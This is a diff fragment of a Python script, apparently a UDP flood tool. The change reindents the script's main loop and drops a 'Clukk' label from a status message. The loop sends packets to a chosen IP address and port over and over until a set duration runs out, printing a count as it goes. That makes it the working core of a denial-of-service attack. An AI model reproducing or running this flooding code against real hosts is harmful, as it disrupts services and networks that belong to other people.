@@ -37,19 +37,16 @@ print("")
 timeout = time.time() + float(duration)
 sent = 0
 
-
-
 while True:
 
-	if time.time() > timeout:
+    if time.time() > timeout:
 
-		break
+        break
 
-	else:
+    else:
 
-		pass
+        pass
 
-	sock.sendto(bytes,(ip, port))
-
-	sent = sent + 1
-	print("-- Clukk: Packet #%s was sent to address %s on port %s."%(sent, ip, port))
+    sock.sendto(bytes,(ip, port))
+    sent = sent + 1
+    print("Packet #%s was sent to address %s on port %s."%(sent, ip, port))
